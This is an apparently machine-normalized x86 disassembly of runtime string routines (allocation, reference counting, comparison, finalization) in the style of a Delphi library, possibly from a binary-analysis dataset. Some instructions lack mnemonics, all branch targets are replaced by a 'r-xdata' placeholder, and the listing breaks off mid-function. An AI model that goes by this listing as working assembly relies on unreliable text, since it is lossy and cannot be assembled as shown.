pop eax
mov edx [ eax ]
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
movzx edx [ edx - 0xc ]
call sub_4493f8
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
call sub_4476cc
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0xc ]
call sub_4474a8
sub_449910
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov ebp ecx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_449348
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
mov edx ebp
call sub_4493f8
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0xa ] 0x1
je r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
push 0x0
mov eax esp
mov ecx ebp
mov edx [ ebx ]
call sub_449f58
pop edi
mov eax edi
mov edx esi
xchg [ ebx ] edi
call sub_4476cc
mov ecx esi
sub eax 0xc
add edx 0xd
jo r-xdata
jmp sub_448080
push eax
mov eax esp
call sub_4474c0
pop eax
add eax 0xc
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ esi + eax ] 0x0
test edi edi
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
push edi
mov eax esp
call sub_449348
pop edi
jmp r-xdata
sub_4499f0
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
push eax
call SysFreeString
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
sub_449a14
cmp [ eax ] edx
je r-xdata
retn
test edx edx
je sub_4499d8
mov ecx [ edx - 0x4 ]
shr ecx 0x1
je sub_4499d8
push ecx
push edx
push eax
call SysReAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_447670
sub_449a3c
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffffc
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
test esi esi
jg r-xdata
lea eax [ esi + 0x1 ]
cmp eax 0x7ff
jge r-xdata
mov eax edi
call sub_4499d8
jmp r-xdata
lea ebx [ esi + 0x1 ]
mov eax edi
mov edx ebx
call sub_449cc0
push esi
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi ]
call sub_449ba4
mov ecx [ ebp - 0x4 ]
mov edx ebx
call sub_4494a8
mov ebx eax
test ebx ebx
jge r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x1004 ]
mov ecx [ ebp - 0x4 ]
mov edx 0x7ff
call sub_4494a8
mov ebx eax
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax edi
mov edx ebx
call sub_449cc0
xor ebx ebx
lea edx [ ebp - 0x1004 ]
mov eax edi
mov ecx ebx
call sub_449ae8
jmp r-xdata
sub_449ae8
test ecx ecx
je sub_4499d8
push eax
push ecx
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_447670
pop edx
push [ edx ]
mov [ edx ] eax
call SysFreeString
retn
sub_449b0c
xor ecx ecx
test edx edx
je r-xdata
jmp sub_449ad8
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_449b3c
xor ecx ecx
test edx edx
je r-xdata
jmp sub_449ae8
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_449b78
xor ecx ecx
test edx edx
je r-xdata
jmp sub_449ad8
mov ecx [ edx - 0x4 ]
cmp [ edx - 0xa ] 0x1
jne r-xdata
jmp sub_449ae8
xchg [ esp ] ecx
push ecx
movzx ecx [ edx - 0xc ]
xchg [ esp + 0x4 ] ecx
jmp sub_449a3c
sub_449bb4
test eax eax
je r-xdata
retn
push eax
xor ecx ecx
pop ecx
sub eax ecx
shr eax 0x1
cmp cx [ eax + 0x2 ]
je r-xdata
add eax 0x2
cmp cx [ eax + 0x4 ]
je r-xdata
add eax 0x2
cmp cx [ eax + 0x6 ]
je r-xdata
add eax 0x2
add eax 0x8
jmp r-xdata
cmp cx [ eax ]
je r-xdata
sub_449be8
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x2
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cx [ esi ]
mov bx [ edi ]
cmp cx bx
jne r-xdata
pop edx
cmp cx bx
jne r-xdata
dec edx
je r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cx bx
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
jmp r-xdata
sub_449c74
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
cmp edx 0x1
jge r-xdata
sub ebx 0x4
mov ebx [ ebx ]
shr ebx 0x1
dec edx
cmp ebx edx
jge r-xdata
xor edx edx
jmp r-xdata
test ecx ecx
jge r-xdata
mov edx ebx
mov esi ebx
sub esi edx
cmp ecx esi
jge r-xdata
xor esi esi
jmp r-xdata
mov ecx [ ebp + 0x8 ]
add edx edx
add edx eax
mov eax esi
xchg ecx eax
call sub_449ae8
pop esi
pop ebx
pop ebp
retn 0x4
mov esi ecx
sub_449cc0
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
jle r-xdata
mov eax edi
mov edx ebx
call sub_4499c8
pop edx
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4499b0
mov ebx eax
mov edx [ edi ]
mov eax edx
mov [ esp ] eax
mov eax [ esp ]
test eax eax
je r-xdata
test eax eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
shr eax 0x1
cmp esi eax
jge r-xdata
mov ecx eax
add ecx ecx
mov eax edx
mov edx ebx
call sub_4476cc
mov eax esi
sub_449d2c
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
cmp [ edx - 0xa ] 0x2
je r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
jmp sub_449f30
[ edx - 0x8 ]
jne r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_44a63c
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
shl ecx 0x1
call sub_4476cc
pop edx
pop eax
jmp r-xdata
lea eax [ edx - 0xc ]
call sub_4474a8
sub_449d80
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
cmp [ edx - 0xa ] 0x2
je r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
jmp sub_449f30
[ edx - 0x8 ]
jne r-xdata
[ edx - 0x8 ]
lea eax [ edx - 0xc ]
call sub_4474a8
sub_449dc4
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffffc
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
test esi esi
jg r-xdata
lea eax [ esi + 0x1 ]
cmp eax 0x7ff
jge r-xdata
mov eax edi
call j_sub_449348
jmp r-xdata
lea ebx [ esi + 0x1 ]
mov eax edi
mov edx ebx
call sub_449fd0
push esi
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi ]
mov ecx [ ebp - 0x4 ]
mov edx ebx
call sub_4494a8
mov ebx eax
test ebx ebx
jge r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x1004 ]
mov ecx [ ebp - 0x4 ]
mov edx 0x7ff
call sub_4494a8
mov ebx eax
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax edi
mov edx ebx
call sub_449fd0
xor ebx ebx
lea edx [ ebp - 0x1004 ]
mov eax edi
mov ecx ebx
call sub_449e68
jmp r-xdata
sub_449e68
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
call sub_44a63c
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_449348
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn
mov edx eax
mov eax esi
shl ecx 0x1
call sub_4476cc
sub_449ea8
xor ecx ecx
test edx edx
je r-xdata
jmp sub_449e58
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_449ed8
xor ecx ecx
test edx edx
je r-xdata
jmp sub_449e68
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_449f14
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_449e68
not ecx
sub_449f58
xchg [ esp ] ecx
push ecx
xor ecx ecx
test edx edx
je r-xdata
jmp r-xdata
cmp [ edx - 0xa ] 0x1
je r-xdata
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
test edi edi
jg r-xdata
pop ecx
xchg [ esp ] ecx
jmp sub_44939c
mov ecx [ edx - 0x4 ]
push edi
movzx eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
xor edx edx
xor eax eax
call sub_44947c
mov ebx eax
mov eax esi
xor ecx ecx
mov edx ebx
call sub_449910
test ebx ebx
jle r-xdata
mov eax esi
call sub_449348
jmp r-xdata
mov eax esi
call sub_449348
push edi
movzx eax [ ebp + 0x8 ]
push eax
mov eax [ esi ]
mov ecx [ ebp - 0x4 ]
mov edx ebx
call sub_44947c
mov eax [ esi ]
sub eax 0xc
movzx edx [ ebp + 0x8 ]
mov [ eax ] dx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_449fd0
push ebx
push esi
push edi
mov ebx eax
mov esi edx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_449348
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
call sub_44a63c
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0xa ] 0x2
je r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
push 0x0
mov eax esp
mov edx [ ebx ]
call sub_449f30
pop edi
mov eax edi
mov edx esi
xchg [ ebx ] edi
shl ecx 0x1
call sub_4476cc
mov ecx esi
sub eax 0xc
add edx edx
jo r-xdata
jmp sub_448080
add edx 0xe
jo r-xdata
push eax
mov eax esp
call sub_4474c0
pop eax
add eax 0xc
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ eax + esi * 2 ] 0x0
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
mov eax esp
call sub_449348
pop edi
jmp r-xdata
sub_44a068
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_449d2c
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
test edx 0xc0000000
jne r-xdata
jmp sub_448080
cmp esi ecx
je r-xdata
call sub_449fd0
mov eax [ ebx ]
mov ecx edi
push 0x0
jmp r-xdata
call sub_449fd0
mov eax esi
mov ecx [ esi - 0x4 ]
push 0x0
cmp [ esi - 0xa ] 0x2
je r-xdata
mov edx [ ebx ]
shl edi 0x1
add edx edi
shl ecx 0x1
call sub_4476cc
mov eax esp
mov edx [ eax ]
test edx edx
je r-xdata
mov edx eax
mov eax esp
call sub_449d2c
mov eax [ esp ]
mov ecx [ eax - 0x4 ]
pop eax
pop edi
pop esi
pop ebx
retn
call sub_449348
sub_44a0e8
test edx edx
je r-xdata
mov edx ecx
jmp sub_449d2c
test ecx ecx
je sub_449d2c
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_44a068
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
test eax 0xc0000000
jne r-xdata
push eax
push ecx
call sub_449d2c
pop edx
pop eax
jmp sub_44a068
jmp sub_448080
call sub_44a63c
mov edi eax
push 0x0
cmp [ ebx - 0xa ] 0x2
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ ebx - 0x4 ]
shl ecx 0x1
call sub_4476cc
cmp [ esi - 0xa ] 0x2
je r-xdata
mov edx ebx
mov eax esp
call sub_449d2c
mov eax esp
call sub_4494d4
mov ebx [ esp ]
mov eax esi
mov ecx [ esi - 0x4 ]
shl ecx 0x1
mov edx [ ebx - 0x4 ]
shl edx 0x1
add edx edi
call sub_4476cc
mov eax [ esp ]
test eax eax
je r-xdata
mov edx esi
mov eax esp
call sub_449d2c
mov esi [ esp ]
pop eax
pop eax
mov edx edi
test edi edi
je r-xdata
mov eax esp
call sub_449348
call sub_449d2c
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_44a1b8
push ebx
push esi
push edi
push edx
push eax
mov ebx edx
xor edi edi
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ eax ] ecx
jne r-xdata
dec edx
jne r-xdata
add eax [ ecx - 0x4 ]
test eax 0xc0000000
jne r-xdata
mov edi ecx
mov eax [ ecx - 0x4 ]
dec edx
jmp r-xdata
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
test edi edi
je r-xdata
jmp sub_448080
cmp edi ecx
jne r-xdata
call sub_44a63c
push eax
mov esi eax
mov edx eax
mov eax [ esp ]
mov esi [ edi - 0x4 ]
call sub_449fd0
mov edi [ esp ]
push [ edi ]
shl esi 0x1
add esi [ edi ]
dec ebx
jmp r-xdata
xor edi edi
dec ebx
jne r-xdata
push 0x0
cmp [ eax - 0xa ] 0x2
je r-xdata
mov eax [ esp + ebx * 4 + 0x18 ]
test eax eax
je r-xdata
pop edx
pop eax
test edi edi
jne r-xdata
mov edx esi
test eax eax
je r-xdata
mov eax [ esp + ebx * 4 + 0x1c ]
mov ecx [ eax - 0x8 ]
inc ecx
jle r-xdata
pop edx
pop edi
pop esi
pop ebx
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
test edx edx
je r-xdata
mov ecx [ eax - 0x4 ]
shl ecx 0x1
add esi ecx
call sub_4476cc
pop eax
test eax eax
je r-xdata
lea eax [ esp + ebx * 4 + 0x1c ]
call sub_4494d4
mov eax [ esp + ebx * 4 + 0x1c ]
mov [ esp ] 0x1
[ eax - 0x8 ]
call sub_449d2c
dec [ edx - 0x8 ]
lea eax [ esp + ebx * 4 + 0x18 ]
call sub_449348
sub_44a294
push ebx
push esi
push edi
push 0x0
push 0x0
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
lea eax [ esp ]
mov edx 0x2
pushf
mov ecx [ eax ]
or ecx [ eax + 0x4 ]
je r-xdata
test esi esi
je r-xdata
popf
pop eax
pop eax
pop edi
pop esi
pop ebx
retn
call sub_44936c
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
cmp [ esi - 0xa ] 0x2
je r-xdata
cmp [ edi - 0xa ] 0x2
je r-xdata
lea eax [ esp ]
mov edx esi
call sub_449f30
mov esi [ esp ]
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
lea eax [ esp + 0x4 ]
mov edx edi
call sub_449f30
mov edi [ esp + 0x4 ]
push edx
shr edx 0x1
je r-xdata
add edx eax
pop edx
and edx 0x1
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cx [ esi ]
mov bx [ edi ]
cmp cx bx
jne r-xdata
pop edx
cmp cx bx
jne r-xdata
dec edx
je r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cx bx
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
jmp r-xdata
sub_44a368
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_44a429
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
cmp ebx 0x1
jge r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
dec ebx
cmp eax ebx
jge r-xdata
xor ebx ebx
jmp r-xdata
test esi esi
jge r-xdata
mov ebx eax
mov edi eax
sub edi ebx
cmp esi edi
jge r-xdata
xor edi edi
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edi esi
mov ax 0x2
mov eax [ ebp - 0x4 ]
sub eax 0xa
movzx eax [ eax ]
jmp r-xdata
mov edx [ ebp - 0x4 ]
add edx ebx
mov eax [ ebp + 0x8 ]
mov ecx edi
call sub_449e58
mov edx ebx
add edx edx
add edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov ecx edi
call sub_449e68
jmp r-xdata
movzx eax ax
cmp eax 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a430
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_44a438
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call j_sub_44a5d8#2
mov eax [ ebx ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
cmp esi 0x1
jl r-xdata
sub eax 0x4
mov eax [ eax ]
mov edx [ ebx ]
mov eax ebx
call sub_4494dc
pop edi
pop esi
pop ebx
retn
cmp eax esi
jl r-xdata
test edi edi
jle r-xdata
dec esi
mov edx eax
sub edx esi
sub edx edi
mov edi edx
test edi edi
jge r-xdata
mov edx [ ebx ]
lea edx [ edx + esi * 2 ]
sub eax edi
mov ecx [ ebx ]
lea eax [ ecx + eax * 2 ]
mov ecx edi
add ecx ecx
call sub_4476cc
lea edx [ edi + esi ]
mov eax ebx
call sub_449fd0
xor edi edi
sub_44a4ac
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_44a5ca
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov esi eax
test esi esi
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a5d1
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov eax [ ebx ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov edi eax
cmp [ ebp - 0x8 ] 0x1
jge r-xdata
sub eax 0x4
mov eax [ eax ]
mov edx [ ebx ]
mov eax ebx
call sub_4494dc
dec [ ebp - 0x8 ]
cmp edi [ ebp - 0x8 ]
jge r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebx ]
cmp eax [ ebp - 0x4 ]
sete [ ebp - 0xd ]
lea eax [ esi + edi ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebp - 0x8 ] edi
mov eax ebx
mov edx [ ebp - 0xc ]
call sub_449fd0
cmp edi [ ebp - 0x8 ]
jle r-xdata
call sub_448080
cmp [ ebp - 0xd ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
add eax esi
mov edx [ ebx ]
lea edx [ edx + eax * 2 ]
mov eax [ ebx ]
mov ecx [ ebp - 0x8 ]
lea eax [ eax + ecx * 2 ]
sub edi [ ebp - 0x8 ]
mov ecx edi
add ecx ecx
call sub_4476cc
mov eax [ ebx ]
mov edx [ ebp - 0x8 ]
lea edx [ eax + edx * 2 ]
mov ecx esi
add ecx ecx
mov eax [ ebp - 0x4 ]
call sub_4476cc
mov eax [ ebx ]
mov edx [ ebp - 0x8 ]
lea edx [ eax + edx * 2 ]
mov ecx esi
add ecx ecx
call sub_4476cc
jmp r-xdata
sub_44a5d8
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx - 0xa ] 0x2
je r-xdata
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push eax
call sub_4494d4
pop eax
mov edx [ eax ]
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
call sub_44a63c
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
shl ecx 0x1
call sub_4476cc
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0xc ]
call sub_4474a8
sub_44a63c
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax eax
jo r-xdata
jmp sub_448080
add eax 0xe
jo r-xdata
call sub_44748c
add eax 0xc
pop edx
mov [ eax - 0x8 ] 0x1
mov [ eax - 0x4 ] edx
mov [ eax + edx * 2 ] 0x0
mov [ eax - 0xa ] 0x2
movzx edx [ rw-data ]
mov [ eax - 0xc ] dx
retn
sub_44a680
test eax eax
je r-xdata
retn
test edx edx
je r-xdata
xor eax eax
retn
push ebx
push esi
push edi
mov esi eax
mov edi edx
mov ecx [ edi - 0x4 ]
push edi
mov edx [ esi - 0x4 ]
dec edx
js r-xdata
pop edx
xor eax eax
jmp r-xdata
mov ax [ esi ]
add esi 0x2
sub ecx edx
jle r-xdata
pop edi
pop esi
pop ebx
[ edi ]
jne r-xdata
mov ebx ecx
push esi
push edi
mov ecx edx
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
pop edx
mov eax edi
sub eax edx
shr eax 0x1
mov ecx ebx
jmp r-xdata
sub_44a6cc
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_44a700
add esi 0x8
dec edi
jg r-xdata
sub_44a700
test ecx ecx
je r-xdata
retn
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
xor ecx ecx
cmp al 0xa
je r-xdata
mov [ ebx ] ecx
add ebx 0x4
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] ecx
add ebx 0x10
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_44a700
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_44a6cc
dec edi
jg r-xdata
pop ebp
cmp al 0x11
je r-xdata
cmp al 0x12
je r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_447670
sub_44a798
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_44a7e8
add esi 0x8
dec edi
jg r-xdata
sub_44a7e8
cmp ecx 0x0
je r-xdata
retn
push eax
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0x12
je r-xdata
mov edx ecx
call sub_44936c
jmp r-xdata
call sub_449348
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xb
je r-xdata
pop edi
pop esi
pop ebx
pop eax
mov edx ecx
call j_sub_44936c
jmp r-xdata
call j_sub_449348
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xc
je r-xdata
mov edx ecx
call sub_4499f0
jmp r-xdata
call sub_4499d8
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_44a7d0
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_44a7e8
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_44a798
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_44b8d8
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
add ebx 0x4
call sub_44b0fc
dec edi
jg r-xdata
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop eax
mov al 0x2
jmp sub_447670
sub_44a91c
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
xor eax eax
mov al [ ecx + 0x1 ]
lea edi [ eax + ecx + 0xa ]
mov ebp [ edi - 0x4 ]
xor eax eax
mov ecx [ edi - 0x8 ]
test ebp ebp
je r-xdata
sub ecx eax
jle r-xdata
push ecx
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax + ebx ]
add eax esi
call sub_4476cc
mov eax [ edi + 0x4 ]
mov edx [ edi ]
mov edx [ edx ]
mov cl [ edx ]
cmp cl 0xa
je r-xdata
mov edx eax
add eax esi
add edx ebx
call sub_4476cc
mov edx [ eax + esi ]
add eax ebx
call sub_44939c
mov eax 0x4
jmp r-xdata
cmp cl 0xb
je r-xdata
add eax [ edi + 0x4 ]
add edi 0x8
dec ebp
jne r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_449a14
mov eax 0x4
jmp r-xdata
cmp cl 0x12
je r-xdata
mov ecx [ edi + 0x4 ]
sub ecx eax
jle r-xdata
pop ecx
mov edx [ eax + esi ]
add eax ebx
call sub_449d2c
mov eax 0x4
jmp r-xdata
cmp cl 0xc
je r-xdata
lea edx [ eax + esi ]
add eax ebx
call sub_44a904
mov eax 0x10
jmp r-xdata
cmp cl 0xd
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
push [ ecx + edx + 0x2 ]
push [ ecx + edx + 0x6 ]
mov ecx [ ecx + edx + 0xa ]
mov ecx [ ecx ]
lea edx [ eax + esi ]
add eax ebx
